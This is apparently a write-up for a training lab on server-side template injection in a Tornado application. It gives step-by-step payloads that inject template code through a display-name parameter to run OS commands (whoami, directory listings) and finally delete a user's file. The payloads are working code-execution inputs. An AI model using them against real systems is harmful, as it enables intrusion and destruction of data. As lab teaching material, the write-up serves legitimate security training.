# Lab: Basic server-side template injection (code context)

> Lab Objective: review the Tornado documentation to discover how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

- Login using provided credentials `wiener:peter`.

- Post a comment in any product page, you'll review your preferred name and the submitted comment.
  ![1st screenshot](./attachments/1.png)

- View `/my-account`, then change the preferred name and inspect the request.

- Add this payload `}}{{7*7` to the value of `blog-post-author-display` parameter.
  ![2nd screenshot](./attachments/2.png)

- Review the comment you just submitted, you'll notice that the result `49` is added to your first name.
  ![3rd screenshot](./attachments/3.png)

- Intercept the preferred name request again, and replace this payload `''}}{%import os%}{{os.system('whoami')}}` with the value of `blog-post-author-display` parameter.
  ![4th screenshot](./attachments/4.png)

- Then view the submitted comment, you'll notice that the command has executed.
  ![5th screenshot](./attachments/5.png)

- Repeat the same steps, but for listing directories of root directory `/` using this payload `''}}{%import os%}{{os.system('ls /')}}`
  ![6th screenshot](./attachments/6.png)
  ![7th screenshot](./attachments/7.png)

- List `/home/` directory using this payload `''}}{%import os%}{{os.system('ls /home/')}}`
  ![8th screenshot](./attachments/8.png)
  ![9th screenshot](./attachments/9.png)

- List `/home/carlos` directory using this payload `''}}{%import os%}{{os.system('ls /home/carlos')}}`
  ![10th screenshot](./attachments/10.png)
  ![11th screenshot](./attachments/11.png)

- Then finally, delete `morale.txt` file in carlos home directory using this payload `''}}{%import os%}{{os.system('rm /home/carlos/morale.txt')}}`
  ![12th screenshot](./attachments/12.png)
  ![13th screenshot](./attachments/13.png)

- And the lab is solved.
  ![14th screenshot](./attachments/14.png)

---
